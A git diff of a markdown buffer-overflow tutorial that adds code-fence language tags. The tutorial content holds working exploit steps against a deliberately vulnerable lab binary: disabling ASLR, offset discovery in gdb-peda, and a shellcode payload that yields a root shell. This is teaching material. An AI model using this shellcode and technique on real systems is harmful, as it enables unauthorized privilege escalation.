@@ -58,7 +58,7 @@ We can see that the stack offsets are equal if we take these steps.  It's worth 
 
 So compile the binary, removing all protections.
 
-```
+```bash
 root@kali:~/bof# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 0
 root@kali:~/bof# gcc bof.c -o bof  -fno-stack-protector -z execstack -m32
@@ -66,7 +66,7 @@ root@kali:~/bof# gcc bof.c -o bof  -fno-stack-protector -z execstack -m32
 
 The first part of the exploitation process is much the same as in Chapter 1.  We first find the point at which `eip` is overrun using a cyclical sequence.
 
-```
+```bash
 gdb-peda$ pattern create 200
 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
 gdb-peda$ r
@@ -90,7 +90,7 @@ We now have to find where to jump to.  For this we'll need to take the steps as 
 
 Now we'll write in a sequence of easily identifiable characters that we can locate when searching memory.  A series of 200 'A' characters should suffice.
 
-```
+```gdb
 gdb-peda$ r
 Starting program: /root/bof/bof 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -101,12 +101,12 @@ Run the find command to search for a series of 'A' characters:
 gdb-peda$ find 0x41414141
 ```
 Then find the result where 'A' repeats 200 times on the stack:  
-```
+```gdb
 [stack] : 0xffffddb0 ('A' <repeats 200 times>)
 ```
 
 An alternative method is to search around `esp`, the stack pointer and look for this sequence:  
-```
+```gdb
 gdb-peda$ x/80x $esp-200
 0xffffdd78:	0x01	0x00	0x00	0x00	0xb0	0xdd	0xff	0xff
 0xffffdd80:	0x38	0xde	0xff	0xff	0x20	0xe3	0xfe	0xf7
@@ -124,12 +124,12 @@ Here we confirm that our sequence begins at `0xffffddb0`.  Assuming this will be
 ### Step 4: Write your Shellcode
 
 For this we'll just grab [this shellcode](https://www.exploit-db.com/exploits/42177/).
-```
-python -c 'from struct import pack; print "\xeb\x34\x5e\x31\xc0\x31\xc9\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb1\x07\x80\x74\x0e\xff\x03\x80\xe9\x01\x75\xf6\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xc7\xff\xff\xff\x2c\x61\x6a\x6d\x2c\x70\x6b".rjust(140, "\x90")+pack("<L", 0xffffddb0)' > /tmp/var
+```bash
+root@kali:~/bof# python -c 'from struct import pack; print "\xeb\x34\x5e\x31\xc0\x31\xc9\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb1\x07\x80\x74\x0e\xff\x03\x80\xe9\x01\x75\xf6\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xc7\xff\xff\xff\x2c\x61\x6a\x6d\x2c\x70\x6b".rjust(140, "\x90")+pack("<L", 0xffffddb0)' > /tmp/var
 ```
 
 We now test it in GDB:
-```
+```gdb
 gdb-peda$ r < /tmp/var
 Starting program: /root/bof/bof < /tmp/var
 process 6648 is executing new program: /bin/dash
@@ -137,8 +137,8 @@ process 6648 is executing new program: /bin/dash
 Warning: not running or target is remote
 ```
 So we know our shellcode is working correctly.  Now we just run it outside the program
-```
-(cat /tmp/var; cat)|./invoke bof
+```bash
+root@kali:~/bof# (cat /tmp/var; cat)|./invoke bof
 id
 uid=0(root) gid=0(root) groups=0(root)
 ls
